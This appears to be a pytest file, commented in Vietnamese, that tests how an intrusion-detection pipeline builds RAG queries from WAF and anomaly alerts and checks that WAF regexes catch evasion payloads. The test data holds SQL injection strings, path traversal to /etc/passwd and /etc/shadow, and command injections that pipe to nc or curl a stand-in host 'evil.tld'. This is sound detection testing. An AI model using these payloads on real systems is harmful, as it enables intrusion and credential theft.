"""Unit tests cho việc dựng truy vấn RAG (`src/agent/nodes.build_rag_queries`).

VÌ SAO QUAN TRỌNG: đây là nguyên nhân gốc của Context Precision thấp trong đánh giá
LLM-as-Judge. Bản cũ nối cụm chuẩn tiếng Anh RỒI payload thô vào CÙNG một chuỗi truy vấn,
với lập luận "đặt nhãn phát hiện lên trước thì nó thắng payload". Lập luận đó sai vì
embedding câu không có trọng số theo vị trí — thêm payload vào là dời cả vector, và
T1190 rớt khỏi top-5 với một payload SQLi chứa chữ `password`.

Các test dưới khoá lại hai bất biến khiến lỗi đó không tái phát:
  1. Truy vấn KỸ THUẬT tuyệt đối KHÔNG chứa nội dung do kẻ tấn công kiểm soát.
  2. Bảng `_ATTACK_TERMS` phải phủ ĐỦ mọi họ chữ ký của `_WAF_PATTERNS`.
"""

import pytest

from src.agent.nodes import _ATTACK_TERMS, _canonical_attack_terms, build_rag_queries
from src.tier1_filter.rule_engine import _WAF_PATTERNS

# ==============================================================================
# BẤT BIẾN 1 — truy vấn kỹ thuật không được nhiễm nội dung của kẻ tấn công
# ==============================================================================


def test_technique_query_excludes_attacker_controlled_payload():
    """Ca hồi quy CHÍNH: chữ `password` trong payload từng kéo T1190 khỏi top-5."""
    log = {
        "tier1_reasons": ["WAF: Phát hiện SQL Injection (SQLi) trong 'message'"],
        "message": "' UNION SELECT password FROM users--",
        "service": "HTTP",
        "Destination Port": 80,
    }
    technique_q, context_q = build_rag_queries(log)

    assert "password" not in technique_q.lower(), "payload KHÔNG được lọt vào truy vấn kỹ thuật"
    assert "union select" not in technique_q.lower()
    assert "SQL injection" in technique_q, "cụm chuẩn tiếng Anh phải có mặt"
    # Payload vẫn được giữ — ở truy vấn NGỮ CẢNH, nơi nó không lái phần ánh xạ kỹ thuật.
    assert "password" in context_q.lower()


def test_technique_query_excludes_uri():
    """URI cũng do kẻ tấn công kiểm soát -> thuộc truy vấn ngữ cảnh, không phải kỹ thuật."""
    log = {
        "tier1_reasons": ["WAF: Phát hiện Path Traversal / LFI trong 'uri'"],
        "URI": "/../../etc/passwd",
    }
    technique_q, context_q = build_rag_queries(log)
    assert "etc/passwd" not in technique_q
    assert "etc/passwd" in context_q


def test_technique_query_keeps_honest_flow_metadata():
    """Metadata luồng (service/port) do HỆ suy ra, không phải kẻ tấn công -> được giữ."""
    log = {"tier1_reasons": [], "service": "SSH", "Destination Port": 22}
    technique_q, _ = build_rag_queries(log)
    assert "service SSH" in technique_q
    assert "destination port 22" in technique_q


def test_context_query_empty_for_pure_netflow():
    """NetFlow thuần (đại đa số lưu lượng) không có payload -> không tốn lượt truy xuất thứ 2."""
    log = {"tier1_reasons": ["Truy cập cổng nhạy cảm (Cổng 22)"], "Destination Port": 22}
    technique_q, context_q = build_rag_queries(log)
    assert technique_q
    assert context_q == ""


def test_empty_log_returns_empty_queries():
    assert build_rag_queries({}) == ("", "")


def test_queries_are_length_bounded():
    log = {
        "tier1_reasons": ["WAF: Phát hiện SQL Injection (SQLi) trong 'message'"] * 5,
        "message": "A" * 5000,
        "URI": "/" + "b" * 5000,
    }
    technique_q, context_q = build_rag_queries(log)
    assert len(technique_q) <= 300
    assert len(context_q) <= 300


# ==============================================================================
# BẤT BIẾN 2 — bảng ánh xạ phải phủ ĐỦ mọi họ chữ ký
# ==============================================================================


def test_attack_terms_cover_all_waf_families():
    """Mọi họ trong `_WAF_PATTERNS` phải sinh ra ít nhất một cụm từ vựng MITRE.

    Trước đây bảng chỉ phủ 7/29 họ; 22 họ còn lại sinh nhãn thuần tiếng Việt nên truy vấn
    rơi hoàn toàn về payload thô. Test này khiến việc thêm họ chữ ký mà quên ánh xạ trở
    thành CI đỏ thay vì một điểm mù im lặng.
    """
    missing = []
    for family in _WAF_PATTERNS:
        reason = f"WAF: Phát hiện {family} trong 'message'"
        if not _canonical_attack_terms([reason]):
            missing.append(family)
    assert not missing, (
        f"{len(missing)}/{len(_WAF_PATTERNS)} họ chữ ký KHÔNG có cụm từ vựng MITRE: {missing}. "
        f"Thêm khoá tra vào `_ATTACK_TERMS` trong src/agent/nodes.py."
    )


def test_canonical_terms_are_english_only():
    """Cụm ánh xạ phải THUẦN ASCII: chuỗi tiếng Việt gần như 0 tín hiệu với embedder EN."""
    for needle, terms in _ATTACK_TERMS:
        assert terms.isascii(), f"cụm cho '{needle}' còn ký tự phi-ASCII: {terms!r}"


@pytest.mark.parametrize(
    ("family", "expect_token"),
    [
        ("Log4Shell / JNDI Injection", "JNDI"),
        ("Ransomware / phá huỷ", "recovery"),
        ("Đánh cắp thông tin xác thực (AD)", "credential"),
        ("Rò rỉ ra dịch vụ ngoài", "xfiltration"),
        ("SSRF / Cloud Metadata", "metadata"),
    ],
)
def test_representative_families_map_to_expected_vocabulary(family, expect_token):
    """Vài họ tiêu biểu từng KHÔNG có ánh xạ — khoá lại để không lặng lẽ mất."""
    terms = " ".join(_canonical_attack_terms([f"WAF: Phát hiện {family} trong 'message'"]))
    assert expect_token.lower() in terms.lower()


# ==============================================================================
# BẤT BIẾN 3 — dị biệt Welford KHÔNG được biến thành một phỏng đoán kỹ thuật
# ==============================================================================


def test_welford_anomaly_describes_feature_not_technique():
    """Lý do dị biệt thống kê phải sinh MÔ TẢ ĐẶC TRƯNG, tuyệt đối không gán họ kỹ thuật.

    HỒI QUY THẬT (đo được): một bản nháp ánh xạ MỌI dị biệt thống kê thành
    "anomalous network traffic volume **beaconing command and control** ...". Hậu quả: một
    flow brute-force web (nhãn thật T1110) chỉ lệch ở `Total Fwd Packets` lại truy xuất ra
    T1071.001 / T1041 / T1571 — đúng kiểu "đoán kỹ thuật từ một con số" mà dự án cấm ở chỗ
    khác. Welford biết DUY NHẤT một điều: đặc trưng nào lệch bao nhiêu sigma.
    """
    reason = (
        "Phát hiện dị biệt thống kê Zero-day [Total Fwd Packets]: "
        "Giá trị 153.0 lệch 4.10 lần độ lệch chuẩn (Z-Score > 3.5 · thang log)"
    )
    terms = " ".join(_canonical_attack_terms([reason])).lower()
    assert "packet count" in terms, "phải mô tả chính đặc trưng đã lệch"
    for guess in ("command and control", "beaconing", "exfiltration"):
        assert guess not in terms, f"KHÔNG được suy đoán họ kỹ thuật {guess!r} từ Z-score"


def test_welford_anomaly_maps_each_known_feature():
    """Mọi đặc trưng Welford đang theo dõi đều phải có mô tả — thiếu là truy vấn trống."""
    from src.agent.nodes import _ANOMALY_FEATURE_TERMS

    missing = []
    for feat in _ANOMALY_FEATURE_TERMS:
        reason = f"Phát hiện dị biệt thống kê Zero-day [{feat}]: Giá trị 1.0 lệch 4.0 lần"
        if not _canonical_attack_terms([reason]):
            missing.append(feat)
    assert not missing, f"đặc trưng không sinh được cụm mô tả: {missing}"


def test_unknown_anomaly_feature_is_silent_not_guessed():
    """Đặc trưng lạ -> KHÔNG sinh cụm nào. Im lặng đúng hơn là bịa một mô tả."""
    reason = "Phát hiện dị biệt thống kê Zero-day [Some New Feature]: Giá trị 1.0 lệch 4.0 lần"
    assert _canonical_attack_terms([reason]) == []


def test_no_duplicate_near_identical_phrases_for_one_reason():
    """Một lý do không được sinh HAI cụm gần trùng — truy vấn loãng đi thì hạng tụt.

    HỒI QUY: bảng từng có hai mục cho cùng họ 'quét cổng' với văn bản khác nhau chút ít;
    khử trùng theo GIÁ TRỊ nên cả hai đều được nối vào, và Recall@3 tụt về 0.
    """
    terms = _canonical_attack_terms(["Quét cổng (Port scan): đã truy cập 11 cổng non-HTTP"])
    joined = " ".join(terms).lower()
    assert joined.count("network service discovery") <= 1, f"cụm bị lặp: {terms}"


# ==============================================================================
# BẤT BIẾN 4 — truy vấn phải dựng từ CẢ LÔ, không phải mỗi log đầu
# ==============================================================================


def test_query_uses_whole_batch_not_just_first_log():
    """HỒI QUY THẬT (bắt được trên luồng demo trực tiếp, không phải giả định).

    Một lô Tier-2 gộp tới 10 log cùng IP. Với chuỗi DAPT, chín log đầu là NetFlow trần và
    chỉ log thứ 9-10 mang `message` nói rõ hoạt động. Bản cũ chỉ đọc `logs[0]`, nên:
      * truy vấn kỹ thuật rơi về từ vựng ngưỡng/khối-lượng,
      * RAG trả T1498/T1499/T1571 (toàn DoS),
      * LLM — được prompt dặn chọn technique TỪ ngữ cảnh RAG — trả lời T1498 cho một sự
        kiện Account Discovery (thật là T1087).
    Không phải LLM suy luận kém: nó chưa bao giờ được thấy dòng chữ quyết định.
    """
    batch = [{"tier1_reasons": [], "service": "HTTPS", "Destination Port": 443} for _ in range(9)]
    batch.append(
        {
            "tier1_reasons": [],
            "service": "HTTPS",
            "Destination Port": 443,
            "message": "[Tương quan SIEM] Hoạt động ghi nhận: Account Discovery; giai đoạn: Foothold.",
        }
    )
    _tech_q, context_q = build_rag_queries(batch)
    assert "Account Discovery" in context_q, (
        "nội dung của log thứ 10 phải vào được truy vấn ngữ cảnh; nếu không, RAG mù"
    )


def test_batch_unions_tier1_reasons_across_logs():
    """Lý do phát hiện của MỌI log trong lô đều thuộc về lô đó — một lô là một chuỗi hành vi."""
    batch = [
        {"tier1_reasons": ["Quét cổng (Port scan): đã truy cập 11 cổng non-HTTP khác nhau"]},
        {"tier1_reasons": ["WAF: Phát hiện SQL Injection (SQLi) trong 'message'"]},
    ]
    technique_q, _ = build_rag_queries(batch)
    assert "network service discovery" in technique_q.lower()
    assert "sql injection" in technique_q.lower()


def test_single_dict_still_accepted():
    """Tương thích ngược: nhiều nơi (test, evaluate_rag_retrieval) vẫn truyền MỘT log."""
    t, _ = build_rag_queries({"tier1_reasons": [], "service": "SSH", "Destination Port": 22})
    assert "service SSH" in t
    assert build_rag_queries([]) == ("", "")
    assert build_rag_queries({}) == ("", "")


# ==============================================================================
# BẤT BIẾN 5 — chữ ký WAF phải bắt các dạng né tránh KINH ĐIỂN
# ==============================================================================


@pytest.mark.parametrize(
    ("payload", "family"),
    [
        # HỒI QUY THẬT (bộ 69 web-attack, 2026-07-28): năm dạng dưới đây từng LỌT HOÀN TOÀN
        # lưới chữ ký Tier-1 và bị DROP — tức dừng hẳn, Tier-2 không có cơ hội bắt.
        ("username=admin'--&password=x", "SQL Injection (SQLi)"),
        ("id=1' AND SUBSTRING(@@version,1,1)='5'--", "SQL Injection (SQLi)"),
        ("id=1' OR 'a'='a", "SQL Injection (SQLi)"),
        ("page=....//....//etc/shadow", "Path Traversal / LFI"),
        ("file=%2e%2e%2f%2e%2e%2fetc/passwd", "Path Traversal / LFI"),
        ("cmd=ls|nc evil.tld 4444", "Command Injection"),
        ("x=whoami && curl http://evil.tld/a", "Command Injection"),
    ],
)
def test_waf_catches_classic_evasions(payload, family):
    assert _WAF_PATTERNS[family].search(payload), (
        f"{family} vẫn bỏ lọt {payload!r} — Tier-1 sẽ DROP và Tier-2 không bao giờ thấy"
    )


@pytest.mark.parametrize(
    "benign",
    [
        "GET /api/v1/users?page=2&sort=name",
        "POST /checkout total=199.99&currency=USD",
        "search=máy tính xách tay -- giảm giá",  # gạch ngang trong văn bản THƯỜNG
        "note=chi phí a|b|c tổng hợp",  # ống dẫn trong văn bản thường
        "path=/var/log/app/2026-07-28.log",
        "q=SELECT a plan from the menu",  # chữ 'select ... from' trong câu tiếng Anh
    ],
)
def test_waf_patterns_do_not_fire_on_benign_text(benign):
    """Bản vá phải NEO vào cú pháp, không bắt trần `--`/`|`/chữ `or`.

    Đo trên dữ liệu thật: 0 dương-tính-giả trên 3.931 sự kiện lành của demo_small.
    """
    hits = [
        f
        for f in ("SQL Injection (SQLi)", "Path Traversal / LFI", "Command Injection")
        if _WAF_PATTERNS[f].search(benign)
    ]
    assert not hits, f"nổ dương-tính-giả trên văn bản thường: {benign!r} -> {hits}"


def test_cum_nguong_khong_tu_khai_ho_ky_thuat():
    """Cụm cho lý do NGƯỠNG chỉ được mô tả HIỆN TƯỢNG, không gán họ kỹ thuật.

    Bản trước nhét thẳng "network denial of service ..." vào cả ba cụm ngưỡng. Một ngưỡng bị
    vượt chỉ chứng minh "khối lượng/nhịp độ bất thường" — DoS, C2 beaconing và rò rỉ dữ liệu
    đều khớp như nhau. Tự khai một họ tạo ra vòng lặp tự khẳng định: truy vấn nói "DoS" ->
    RAG trả DoS -> LLM đọc lại chính lời tự khai đó như bằng chứng. Đo được trên luồng sống:
    82% truy vấn trả top-1 = T1498.
    """
    from src.agent.nodes import _ATTACK_TERMS, _THRESHOLD_KEYS

    cam = ("denial of service", "brute force", "exfiltration", "command and control", "impact")
    for vi, en in _ATTACK_TERMS:
        if vi in _THRESHOLD_KEYS:
            xau = [c for c in cam if c in en.lower()]
            assert not xau, f"cụm ngưỡng {vi!r} tự khai họ kỹ thuật {xau}: {en!r}"


def test_generic_terms_suy_ra_tu_bang_khong_chep_tay():
    """`_GENERIC_TERMS` phải SUY RA từ `_ATTACK_TERMS`, không chép tay.

    Chép tay đã hỏng một lần: sửa lời trong bảng thì tập khử vẫn trỏ chuỗi cũ, cơ chế loại
    cụm-chung-khi-đã-có-chữ-ký tắt IM LẶNG mà không có gì đỏ lên để báo.
    """
    from src.agent.nodes import (
        _ANOMALY_FEATURE_TERMS,
        _ATTACK_TERMS,
        _GENERIC_TERMS,
        _THRESHOLD_KEYS,
    )

    mong_doi = {en for vi, en in _ATTACK_TERMS if vi in _THRESHOLD_KEYS} | set(
        _ANOMALY_FEATURE_TERMS.values()
    )
    assert _GENERIC_TERMS == mong_doi, "GENERIC_TERMS lệch khỏi bảng nguồn"
    assert len(_THRESHOLD_KEYS) == 3
